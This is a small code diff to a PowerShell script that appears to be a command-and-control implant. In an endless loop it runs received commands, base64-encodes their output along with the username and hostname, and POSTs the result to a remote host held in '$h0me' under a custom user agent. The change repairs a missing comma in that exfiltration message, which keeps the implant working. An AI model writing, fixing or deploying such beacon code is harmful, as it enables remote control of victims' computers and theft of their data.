@@ -129,7 +129,7 @@ while ($True) {
 			$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
 		}
 		$jsObject.cmnd = ""
-		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`" `"$rettype`": `"$ncoded`"}"
+		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"hn`": `"$hn`", `"$rettype`": `"$ncoded`"}"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
 	}
 	Start-Sleep -Milliseconds $sleepytime
